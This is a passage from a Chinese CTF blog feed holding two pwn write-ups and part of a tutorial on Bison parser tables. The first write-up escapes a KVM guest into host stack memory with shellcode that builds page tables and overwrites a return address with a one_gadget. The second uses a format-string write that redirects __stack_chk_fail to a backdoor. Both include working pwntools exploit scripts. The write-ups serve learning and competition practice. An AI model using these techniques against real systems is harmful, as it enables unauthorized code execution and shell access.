guest_sregs; <span class="comment">// [rsp+130h] [rbp-8150h]</span></span><br><span class="line">  <span class="keyword">char</span> guest_mem[<span class="number">32776</span>]; <span class="comment">// [rsp+270h] [rbp-8010h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v32; <span class="comment">// [rsp+8278h] [rbp-8h]</span></span><br><span class="line">  __int64 savedregs; <span class="comment">// [rsp+8280h] [rbp+0h]</span></span><br><span class="line"></span><br><span class="line">  v32 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(guest_mem, <span class="number">0</span>, <span class="number">0x8000</span>uLL);</span><br><span class="line">  aligned_guest_mem = &amp;guest_mem[<span class="number">4096LL</span> - ((&amp;savedregs + <span class="number">0x7FF0</span>) &amp; <span class="number">0xFFF</span>)];<span class="comment">// </span></span><br><span class="line">                                                <span class="comment">// 经过动调发现savedregs+0x7ff0其实就是刚才memset里面s的位置</span></span><br><span class="line">                                                <span class="comment">// 然后((&amp;savedregs + 0x7ff0) &amp; 0xfff)就是取s的地址的低3位</span></span><br><span class="line">                                                <span class="comment">// 然后用0x1000减掉低三位得到一个值,这个值也就是地址加多少可以取到最近的整数</span></span><br><span class="line">                                                <span class="comment">// 所以说这里的功能是让aligned_guest_mem取整</span></span><br><span class="line">                                                <span class="comment">// 举个例子就是假如guest_mem的起始地址为0x7fffffff5c50</span></span><br><span class="line">                                                <span class="comment">// 让他取整就是取到0x7fffffff6000</span></span><br><span class="line">  code_size = <span class="number">-1</span>;</span><br><span class="line">  read_n(<span class="number">4LL</span>, &amp;code_size);                      <span class="comment">// 这里需要输入的字符转成对应的数字需要小于0x4000,所以说输入的就应该是\x00\x40\x00\x00</span></span><br><span class="line">  <span class="keyword">if</span> ( code_size &lt;= <span class="number">0x4000</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    read_n(code_size, aligned_guest_mem);       <span class="comment">// 如果按照上面咱们输入的\x00\x40\x00\x00的话,咱们就需要输入0x4000个字符</span></span><br><span class="line">                                                <span class="comment">// 然后这些字符存储到aligned_guest_mem中</span></span><br><span class="line">    kvmfd = open(<span class="string">&quot;/dev/kvm&quot;</span>, <span class="number">0x80002</span>);</span><br><span class="line">    <span class="keyword">if</span> ( kvmfd &lt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      errno_kvm = open(<span class="string">&quot;/dev/kvm&quot;</span>, <span class="number">0x80002</span>);</span><br><span class="line">      kvmfd = errno_kvm;</span><br><span class="line">      err(errno_kvm, <span class="string">&quot;fail line: %d&quot;</span>, <span class="number">40LL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 0xAE01 : KVM_CREATE_VM</span></span><br><span class="line">    vmfd = ioctl(kvmfd, <span class="number">0xAE01</span>uLL, <span class="number">0LL</span>);        <span class="comment">// 创建虚拟机，获取到虚拟机句柄</span></span><br><span class="line">    <span class="keyword">if</span> ( vmfd &lt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      errno_create_kvm = ioctl(kvmfd, <span class="number">0xAE01</span>uLL, <span class="number">0LL</span>);</span><br><span class="line">      vmfd = errno_create_kvm;</span><br><span class="line">      err(errno_create_kvm, <span class="string">&quot;fail line: %d&quot;</span>, <span class="number">43LL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    region.slot = <span class="number">0LL</span>;</span><br><span class="line">    region.guest_phys_addr = <span class="number">0LL</span>;</span><br><span class="line">    region.memory_size = <span class="number">0x8000</span>LL;</span><br><span class="line">    region.userspace_addr = aligned_guest_mem;</span><br><span class="line">    <span class="comment">// 0x4020ae46 : KVM_SET_USER_MEMORY_REGION</span></span><br><span class="line">    <span class="keyword">if</span> ( ioctl(vmfd, <span class="number">0x4020AE46</span>uLL, &amp;region) &lt; <span class="number">0</span> )<span class="comment">// 为虚拟机映射内存,还有其他的PCI,信号处理的初始化</span></span><br><span class="line">    &#123;</span><br><span class="line">      errno_set_user_memory = ioctl(vmfd, <span class="number">0x4020AE46</span>uLL, &amp;region);</span><br><span class="line">      err(errno_set_user_memory, <span class="string">&quot;fail line: %d&quot;</span>, <span class="number">52LL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 0xae41 : KVM_CREATE_VCPU</span></span><br><span class="line">    vcpu = ioctl(vmfd, <span class="number">0xAE41</span>uLL, <span class="number">0LL</span>);         <span class="comment">// 创建vCPU</span></span><br><span class="line">    <span class="keyword">if</span> ( vcpu &lt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      errno_create_vcpu = ioctl(vmfd, <span class="number">0xAE41</span>uLL, <span class="number">0LL</span>);</span><br><span class="line">      vcpu = errno_create_vcpu;</span><br><span class="line">      err(errno_create_vcpu, <span class="string">&quot;fail line: %d&quot;</span>, <span class="number">55LL</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 0xAE04uLL : KVM_GET_VCPU_MMAP_SIZE</span></span><br><span class="line">    vcpu_mmap_size = ioctl(kvmfd, <span class="number">0xAE04</span>uLL, <span class="number">0LL</span>);<span class="comment">// 为vCPU分配内存空间</span></span><br><span class="line">    run_mem = mmap(<span class="number">0LL</span>, vcpu_mmap_size, <span class="number">3</span>, <span class="number">1</span>, vcpu, <span class="number">0LL</span>);</span><br><span class="line">    <span class="built_in">memset</span>(&amp;guest_regs, <span class="number">0</span>, <span class="keyword">sizeof</span>(guest_regs));</span><br><span class="line">    guest_regs._rsp = <span class="number">0xFF0</span>LL;</span><br><span class="line">    guest_regs.rflags = <span class="number">2LL</span>;</span><br><span class="line">    <span class="comment">// 0x4090ae82 : KVM_SET_REGS</span></span><br><span class="line">    <span class="keyword">if</span> ( ioctl(vcpu, <span class="number">0x4090AE82</span>uLL, &amp;guest_regs) &lt; <span class="number">0</span> )<span class="comment">// 设置寄存器</span></span><br><span class="line">    &#123;</span><br><span class="line">      errno_set_regs = ioctl(vcpu, <span class="number">0x4090AE82</span>uLL, &amp;guest_regs);</span><br><span class="line">      err(errno_set_regs, <span class="string">&quot;fail line: %d&quot;</span>, <span class="number">66LL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 0x8138AE83uLL : KVM_GET_SREGS</span></span><br><span class="line">    <span class="keyword">if</span> ( ioctl(vcpu, <span class="number">0x8138AE83</span>uLL, &amp;guest_sregs) &lt; <span class="number">0</span> )<span class="comment">// 获取特殊寄存器</span></span><br><span class="line">    &#123;</span><br><span class="line">      errno_get_sregs = ioctl(vcpu, <span class="number">0x8138AE83</span>uLL, &amp;guest_sregs);</span><br><span class="line">      err(errno_get_sregs, <span class="string">&quot;fail line: %d&quot;</span>, <span class="number">69LL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v20 = <span class="number">0x7000</span>LL;</span><br><span class="line">    v21 = <span class="number">0x6000</span>LL;</span><br><span class="line">    v22 = <span class="number">0x5000</span>LL;</span><br><span class="line">    v23 = <span class="number">0x4000</span>LL;</span><br><span class="line">    *(aligned_guest_mem + <span class="number">0xE00</span>) = <span class="number">3LL</span>;         <span class="comment">// 设置4级页表,因为cr0对应的第31位的值为1,所以说开启了分页机制所以就需要设置4级页表</span></span><br><span class="line">                                                <span class="comment">// 这里看了一眼汇编代码这里虽然加的是0xe00,但是对应汇编代码加的还是0x7000</span></span><br><span class="line">    *&amp;aligned_guest_mem[v20 + <span class="number">8</span>] = <span class="number">0x1003</span>LL;</span><br><span class="line">    *&amp;aligned_guest_mem[v20 + <span class="number">16</span>] = <span class="number">0x2003</span>LL;</span><br><span class="line">    *&amp;aligned_guest_mem[v20 + <span class="number">24</span>] = <span class="number">0x3003</span>LL;</span><br><span class="line">    *&amp;aligned_guest_mem[v21] = v20 | <span class="number">3</span>;</span><br><span class="line">    *&amp;aligned_guest_mem[v22] = v21 | <span class="number">3</span>;</span><br><span class="line">    *&amp;aligned_guest_mem[v23] = v22 | <span class="number">3</span>;</span><br><span class="line">    v25 = <span class="number">0LL</span>;</span><br><span class="line">    v26 = <span class="number">0x1030010FFFFFFFF</span>LL;</span><br><span class="line">    v27 = <span class="number">0x101010000</span>LL;</span><br><span class="line">    guest_sregs.cr3 = v23;</span><br><span class="line">    guest_sregs.cr4 = <span class="number">32LL</span>;</span><br><span class="line">    guest_sregs.cr0 = <span class="number">0x80050033</span>LL;</span><br><span class="line">    guest_sregs.efer = <span class="number">0x500</span>LL;</span><br><span class="line">    guest_sregs.cs.base = <span class="number">0LL</span>;</span><br><span class="line">    *&amp;guest_sregs.cs.limit = <span class="number">0x10B0008FFFFFFFF</span>LL;</span><br><span class="line">    *&amp;guest_sregs.cs.dpl = <span class="number">0x101010000</span>LL;</span><br><span class="line">    guest_sregs.ss.base = <span class="number">0LL</span>;</span><br><span class="line">    *&amp;guest_sregs.ss.limit = <span class="number">0x1030010FFFFFFFF</span>LL;</span><br><span class="line">    *&amp;guest_sregs.ss.dpl = <span class="number">0x101010000</span>LL;</span><br><span class="line">    guest_sregs.gs.base = <span class="number">0LL</span>;</span><br><span class="line">    *&amp;guest_sregs.gs.limit = <span class="number">0x1030010FFFFFFFF</span>LL;</span><br><span class="line">    *&amp;guest_sregs.gs.dpl = <span class="number">0x101010000</span>LL;</span><br><span class="line">    guest_sregs.fs.base = <span class="number">0LL</span>;</span><br><span class="line">    *&amp;guest_sregs.fs.limit = <span class="number">0x1030010FFFFFFFF</span>LL;</span><br><span class="line">    *&amp;guest_sregs.fs.dpl = <span class="number">0x101010000</span>LL;</span><br><span class="line">    guest_sregs.es.base = <span class="number">0LL</span>;</span><br><span class="line">    *&amp;guest_sregs.es.limit = <span class="number">0x1030010FFFFFFFF</span>LL;</span><br><span class="line">    *&amp;guest_sregs.es.dpl = <span class="number">0x101010000</span>LL;</span><br><span class="line">    guest_sregs.ds.base = <span class="number">0LL</span>;</span><br><span class="line">    *&amp;guest_sregs.ds.limit = <span class="number">0x1030010FFFFFFFF</span>LL;</span><br><span class="line">    *&amp;guest_sregs.ds.dpl = <span class="number">0x101010000</span>LL;</span><br><span class="line">    <span class="comment">// 0x4138AE84 : KVM_SET_SREGS</span></span><br><span class="line">    <span class="keyword">if</span> ( ioctl(vcpu, <span class="number">0x4138AE84</span>uLL, &amp;guest_sregs) &lt; <span class="number">0</span> )<span class="comment">// 设置特殊寄存器</span></span><br><span class="line">    &#123;</span><br><span class="line">      errno_set_sregs = ioctl(vcpu, <span class="number">0x4138AE84</span>uLL, &amp;guest_sregs);</span><br><span class="line">      err(errno_set_sregs, <span class="string">&quot;fail line: %d&quot;</span>, <span class="number">105LL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 0xae80 : KVM_RUN</span></span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      ioctl(vcpu, <span class="number">0xAE80</span>uLL, <span class="number">0LL</span>);              <span class="comment">// 开始运行虚拟机</span></span><br><span class="line">      exit_reason = run_mem-&gt;exit_reason;</span><br><span class="line">      <span class="keyword">if</span> ( exit_reason == <span class="number">5</span> || exit_reason == <span class="number">8</span> )<span class="comment">// KVM_EXIT_HLT | KVM_EXIT_SHUTDOWN</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( exit_reason == <span class="number">2</span> )                   <span class="comment">// KVM_EXIT_IO</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( run_mem-&gt;io.direction == <span class="number">1</span> &amp;&amp; run_mem-&gt;io.port == <span class="number">0x3F8</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v16 = run_mem-&gt;io.size;</span><br><span class="line">          v24 = run_mem-&gt;io.data_offset;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;%.*s&quot;</span>, v16 * run_mem-&gt;ex.error_code, run_mem + v24);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n[loop] exit reason: %d\n&quot;</span>, run_mem-&gt;exit_reason);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n[loop] goodbye!&quot;</span>);</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[init] hold your horses&quot;</span>);</span><br><span class="line">    result = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>漏洞点：</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">memset</span>(guest_mem, <span class="number">0</span>, <span class="number">0x8000</span>uLL);</span><br><span class="line">aligned_guest_mem = &amp;guest_mem[<span class="number">4096LL</span> - ((&amp;savedregs + <span class="number">0x7FF0</span>) &amp; <span class="number">0xFFF</span>)];</span><br><span class="line"></span><br><span class="line">region.slot = <span class="number">0LL</span>;</span><br><span class="line">region.guest_phys_addr = <span class="number">0LL</span>;</span><br><span class="line">region.memory_size = <span class="number">0x8000</span>LL;</span><br><span class="line">region.userspace_addr = aligned_guest_mem;</span><br></pre></td></tr></table></figure><p>从上面的代码可以看出程序预计给虚拟机分配0x8000大小的空间，然后进行了个对齐操作使得分配的真实地址为aligned_guest_mem，然后后面实际再给虚拟机分配的时候还是分配了0x8000大小的空间，这样就会导致虚拟机越界读到了主机的内存。</p><p>首先我们看到我们memset的地址如下</p><p><img src="https://i.loli.net/2020/09/25/vHc9aoD4Smt6XAw.png" alt="image-20200925224629609.png"></p><p>对齐后的地址如下。</p><p><img src="https://i.loli.net/2020/09/25/zHNjYs5uEqfrtDx.png" alt="image-20200925224707504.png"></p><p>通过动态调试我们发现返回地址所在地址<code>(0x7FFFFFFFDE68)</code>包含在<code>aligned_guest_mem(0x7FFFFFFF6000)</code>到<code>aligned_guest_mem+0x8000(0x7FFFFFFFE000)</code>内，注意此处的aligned_guest_mem是通过分配host的栈空间作为VM的进程空间。对于host来说地址是<code>aligned_guest_mem</code>到<code>aligned_guest_mem+0x8000</code>，而对于虚拟机来说地址是<code>0</code>到<code>0x8000</code>。</p><p><img src="https://i.loli.net/2020/09/25/EPRjwCrOscaJSbm.png" alt="image-20200925225217368.png"></p><p>用下图来更清晰的表示。</p><p><img src="https://i.loli.net/2020/09/25/9UJeq7CaGh4d3ID.png" alt="image-20200925224348738.png"></p><p>然后程序有两个输入点，第一个输入的值会作为第二个输入点的可输入长度然后第二个输入点，输入的内容可以作为shellcode执行。</p><p>下面就是利用这个地方，在动调的过程中可以发现最后main返回的地址是存储在over这个区域的，所以就需要对存储返回地址的地方进行写操作，写成onegadget的地址就可以拿到shell了，写操作需要注意的就是[0x1000]这样读0x1000地址存储的内容不一定会读到0x1000，因为有分页机制所以虚拟地址需要转换成物理地址才可以使用，还需要注意一点的是64位环境下使用的是4级页表是48位，然后分为9、9、9、12四段，如下图所示。</p><p><img src="https://i.loli.net/2020/09/25/N2RVtIPu9kFXejn.png" alt="image-20200925230016886.png"></p><p>根据这四段来获取到物理地址所以我们的shellcode就需要确保经过转换后的地址对应着的是返回地址。</p><p>具体的做法就是<strong>更改cr3的值</strong>，<strong>自己构造4级页表</strong>，<strong>促使[0x1000]这样访问到的内存就是0x7000地址处的内存</strong>，这里访问到0x7000是因为0x7000到0x8000包含了越界的部分，所以我们只需要循环遍历0x7000到0x8000以便找到ebp，从而控制执行流，其中页表的访问方式就应该是这样的，用我手画的图表示如下（以访问0x1000为例）：</p><p><img src="https://i.loli.net/2020/09/25/ZGhBCqprunD48x5.png" alt="image-20200925230906050.png"></p><p>后面的0x1003、0x2003、0x3003等在ida中可看到。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v20 = <span class="number">0x7000</span>LL;</span><br><span class="line">v21 = <span class="number">0x6000</span>LL;</span><br><span class="line">v22 = <span class="number">0x5000</span>LL;</span><br><span class="line">v23 = <span class="number">0x4000</span>LL;</span><br><span class="line">*(aligned_guest_mem + <span class="number">0xE00</span>) = <span class="number">3LL</span>;</span><br><span class="line">*&amp;aligned_guest_mem[v20 + <span class="number">8</span>] = <span class="number">0x1003</span>LL;</span><br><span class="line">*&amp;aligned_guest_mem[v20 + <span class="number">16</span>] = <span class="number">0x2003</span>LL;</span><br><span class="line">*&amp;aligned_guest_mem[v20 + <span class="number">24</span>] = <span class="number">0x3003</span>LL;</span><br></pre></td></tr></table></figure><p>所以我们的shellcode就需要确保经过转换后的地址对应着的是返回地址，然后把返回地址改成oengadget就可以拿到shell了。</p><p>exp最开始设置访问的地址是0x1020，然后一直循环访问到对应地址存储的内容不是0的地方，经过动调发现在retun的返回地址前只有3个地址是有内容的，再往前看都是0，所以循环结束后访问的地址就是return的返回地址-3，所以要修改retuen的地址就需要+3，然后把这个地址里面的内容修改成one_gadget就可以拿到shell了。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./kvm&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./kvm&quot;</span>)</span><br><span class="line">payload = asm(</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mov qword ptr [0x1000], 0x2003</span></span><br><span class="line"><span class="string">    mov qword ptr [0x2000], 0x3003</span></span><br><span class="line"><span class="string">    mov qword ptr [0x3000], 0x0003</span></span><br><span class="line"><span class="string">    mov qword ptr [0x0], 0x3</span></span><br><span class="line"><span class="string">    mov qword ptr [0x8], 0x7003</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rax, 0x1000</span></span><br><span class="line"><span class="string">    mov cr3, rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rcx, 0x1020</span></span><br><span class="line"><span class="string">#############search ret#############</span></span><br><span class="line"><span class="string">look_for_ra:   </span></span><br><span class="line"><span class="string">    add rcx, 8</span></span><br><span class="line"><span class="string">    cmp qword ptr [rcx], 0</span></span><br><span class="line"><span class="string">    je look_for_ra</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    add rcx, 24</span></span><br><span class="line"><span class="string">#############overwrite ret#############</span></span><br><span class="line"><span class="string">overwrite_ra:  </span></span><br><span class="line"><span class="string">    mov rax, qword ptr [rcx]</span></span><br><span class="line"><span class="string">    add rax, 0x249e6</span></span><br><span class="line"><span class="string">    mov qword ptr [rcx], rax</span></span><br><span class="line"><span class="string">    hlt</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">)</span><br><span class="line">log.success(<span class="string">&#x27;len = &#x27;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">p.send(<span class="string">&quot;\x68\x00\x00\x00&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recv(<span class="number">16</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>对于exp几个疑惑的点：</p><ul><li><p>0x1020 ：这里我本来写的是0x1000，但是没打通，在0x7000开始处我们写了四个字段，所以我们应该先跳过这四个字段开始，经过动态调试发现返回地址只有前面三个字段有内容，其他都是0，所以一次遍历到不为0为止，然后我们add 24，跳过这三个字段就能到达ret处。</p><p><img src="https://i.loli.net/2020/09/25/tph8ysFVoinqW1f.png" alt="image-20200925232304528.png"></p></li><li><p>0x249e6 : 这里是返回地址到one_gadget地址的偏移，动态调试后发现execve_addr-ret_addr=0x249e6。</p></li></ul><p>成功利用截图：</p><p><img src="https://i.loli.net/2020/09/25/T2rDMolGOvBZkJI.png" alt="image-20200925232856994.png"></p>]]></content:encoded>
      
      <comments>https://billyotry.github.io/2021/01/22/[Confidence%20CTF]kvm/#disqus_thread</comments>
    </item>
    
    <item>
      <title>[BJD2nd]r2t4</title>
      <link>https://billyotry.github.io/2021/01/22/[BJD2nd]r2t4/</link>
      <guid>https://billyotry.github.io/2021/01/22/[BJD2nd]r2t4/</guid>
      <pubDate>Thu, 21 Jan 2021 16:59:43 GMT</pubDate>
      <description>
      
        
        
          &lt;p&gt;第一步当然就是日常查保护&lt;/p&gt;
&lt;p&gt;会看到堆栈不可执行还有NX保护&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2020/03/24/3TGJyWszCMu9dfO.png&quot; alt=&quot;image-20200323213631230.png&quot;
        
      
      </description>
      
      
      <content:encoded><![CDATA[<p>第一步当然就是日常查保护</p><p>会看到堆栈不可执行还有NX保护</p><p><img src="https://i.loli.net/2020/03/24/3TGJyWszCMu9dfO.png" alt="image-20200323213631230.png"></p><p>然后就丢进IDA，F5</p><p><img src="https://i.loli.net/2020/03/24/N7gIPZSzXCDVjsv.png" alt="image-20200323214009122.png"></p><p><img src="https://i.loli.net/2020/03/24/8djRsrFqJOf93mx.png" alt="image-20200323214325901.png"></p><p>很明显的格式化字符串，发现出题人还留了后门函数，但是这个backdoor这个英语给我整笑了。这里一开始的思路是利用栈溢出泄露canary出来后然后填在ebp-8的位置上绕过栈保护，再控制程序流程去执行后门函数。想了半天也不知道为什么，调试程序的时候发现他只有一次输入一次输入，就是说泄露的canary之后没法再把payload输进去，想了半天都不知道怎么办，甚至还一度的怀疑是出题人出错了。</p><p>后来想到了这里并不能通过格式化泄露canary来绕过栈保护，而是进入任意地址写，将后门函数写进返回地址里面，又做了好久依旧没有打通，后来经过1p0ch师傅的指点，这里应该要将后门函数写到stack_chk_fail里面。我们知道当canary被修改了之后，会触发stack_chk_fail函数，所以可以利用这一点。(不过这种操作也是第一次听说，学到了)。</p><p>接下来先看下偏移是多少</p><p><img src="https://i.loli.net/2020/03/24/aJWXOuUT9jMkFlg.png" alt="image-20200323220148164.png"></p><p>很明显看到偏移是6</p><p>那么我们接下来就可以写exp了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./r2t4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./r2t4&#x27;</span>)</span><br><span class="line">stack_addr=elf.got[<span class="string">&#x27;__stack_chk_fail&#x27;</span>]</span><br><span class="line"></span><br><span class="line">backdoor=<span class="number">0x400626</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;%1574c%8$hnaaaaa&#x27;</span>+p64(`stack_addr)+<span class="string">&#x27;a&#x27;</span>*<span class="number">12</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>1574是0x626是十进制</p><p>这里偏移为8是因为’%1574c%8’为偏移6，’$hnaaaaa’为偏移7，那么要写入的p64(stack_addr)就是偏移8了。后面的aaaaa是为了对齐地址。</p><p>这里为了触发__stack_chk_fail，payload的长度就要是0x30,也就是48.</p>]]></content:encoded>
      
      <comments>https://billyotry.github.io/2021/01/22/[BJD2nd]r2t4/#disqus_thread</comments>
    </item>
    
    <item>
      <title>Understanding C parsers generated by GNU Bison</title>
      <link>https://billyotry.github.io/2021/01/22/Understanding%20C%20parsers%20generated%20by%20GNU%20Bison/</link>
      <guid>https://billyotry.github.io/2021/01/22/Understanding%20C%20parsers%20generated%20by%20GNU%20Bison/</guid>
      <pubDate>Thu, 21 Jan 2021 16:59:43 GMT</pubDate>
      <description>
      
        
        
          &lt;h3 id=&quot;table分析&quot;&gt;&lt;a href=&quot;#table分析&quot; class=&quot;headerlink&quot; title=&quot;table分析&quot;&gt;&lt;/a&gt;table分析&lt;/h3&gt;&lt;p&gt;bision与flex类似，有一系列的表，理清这些表之间的关系及索引方式后能更好的理解&lt;code&gt;y
        
      
      </description>
      
      
      <content:encoded><![CDATA[<h3 id="table分析"><a href="#table分析" class="headerlink" title="table分析"></a>table分析</h3><p>bision与flex类似，有一系列的表，理清这些表之间的关系及索引方式后能更好的理解<code>yyparse</code>。</p><h4 id="yytranslate"><a href="#yytranslate" class="headerlink" title="yytranslate"></a>yytranslate</h4><p>此表映射了token和symbol token之间的关系。如果是预定义的<code>%token</code>，则会映射到其他的token序号中；如果是普通的终结符，则会把字符对应的ascii码映射到对应token中。</p><p>例如<code>S: &#39;\n&#39; ;</code>规则在生成后如下</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* YYTRANSLATE[YYLEX] -- Bison symbol number corresponding to YYLEX.  */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> yytype_uint8 yytranslate[] =</span><br><span class="line">&#123;</span><br><span class="line">       <span class="number">0</span>,     <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">2</span>,</span><br><span class="line">       <span class="number">3</span>,     <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">2</span>,</span><br><span class="line">...       </span><br><span class="line">       <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">2</span>,     <span class="number">1</span>,     <span class="number">2</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>&#39;\n&#39;</code>的ascii为10,所以yytranslate[10]=3</p><p>多数映射的token为2，2是未定义，只有在语法中定义的符号才被赋予有效的符号编号。</p><p>这里的<code>&#39;\n&#39;</code>为什么是3，那是因为终结符的编号从3开始，可以通过查看输出解析器中生成的yytname数组来检查分配给各种符号的符号编号，而这里的例子符号编号如下所示。</p><table><thead><tr><th align="center"><em>Symbol</em></th><th align="center"><em>Number</em></th></tr></thead><tbody><tr><td align="center">$end</td><td align="center">0</td></tr><tr><td align="center">error</td><td align="center">1</td></tr><tr><td align="center">$undefined</td><td align="center">2</td></tr><tr><td align="center">\n</td><td align="center">3</td></tr></tbody></table><p>每当<code>yyparse()</code>需要token时，它都会调用<code>yylex</code>，然后获取对应token的symbol token内部码。</p><h4 id="yydefact"><a href="#yydefact" class="headerlink" title="yydefact"></a>yydefact</h4><p>此表存储了每个状态下对应的产生式规则的序号。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* YYDEFACT[STATE-NAME] -- Default rule to reduce with in state</span></span><br><span class="line"><span class="comment">   STATE-NUM when YYTABLE doesn&#x27;t specify something else to do.  Zero</span></span><br><span class="line"><span class="comment">   means the default is an error.  */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> yytype_uint8 yydefact[] =</span><br><span class="line">&#123;</span><br><span class="line">       <span class="number">0</span>,     <span class="number">2</span>,     <span class="number">0</span>,     <span class="number">1</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>在STATE-NAME状态下，通过yydefact[STATE-NAME]来获取其对应的产生式规则的序号。</p></blockquote><p>其中，<code>0</code>号表示error。由于默认<code>($accept → L $end)</code>rule(其rule number为1)的存在，我们定义的所有rule索引都会增加1。即我们定义的第一个rule <code>S: &#39;\n&#39; ;</code>, 其rule number在此处为2。</p><h4 id="yydefgoto"><a href="#yydefgoto" class="headerlink" title="yydefgoto"></a>yydefgoto</h4><p>yydefgoto是GOTO跳转表的压缩形式。它的元素数量为语法中非终结符的数量，元素的值表示每个非终结符要跳转的状态。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* yydefgoto[nth non-terminal] = most common GOTO state for the nth non-terminal. */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> yytype_int8 yydefgoto[] =</span><br><span class="line">&#123;</span><br><span class="line">      <span class="number">-1</span>,     <span class="number">2</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>索引方式为<code>yytranslate</code>表中的符号编号减去非终结符的数目。</p><p>parser在用rule归约栈上内容的时候会查询yydefgoto，但在某些状态下会使用yytable表。</p><p>第一个非终结符<code>$accept</code>的rule为-1(即yydefgoto[0]),<code>$accept</code>不会被归约。</p><h4 id="yyr1-and-yyr2"><a href="#yyr1-and-yyr2" class="headerlink" title="yyr1 and yyr2"></a>yyr1 and yyr2</h4><p>yyr1表示每个rule左部的symbol数量，通过yyr1，当进行归约时，我们需要知道用于还原以转换为适当状态的规则的LHS符号，这就是该表使用的地方。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* YYR1[YYN] -- Symbol number of symbol that rule YYN derives.  */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> yytype_uint8 yyr1[] =</span><br><span class="line">&#123;</span><br><span class="line">       <span class="number">0</span>,     <span class="number">4</span>,     <span class="number">5</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>yyr2表示每个rule右部的symbol数量，</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* YYR2[YYN] -- Number of symbols composing right hand side of rule YYN.  */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> yytype_uint8 yyr2[] =</span><br><span class="line">&#123;</span><br><span class="line">       <span class="number">0</span>,     <span class="number">2</span>,     <span 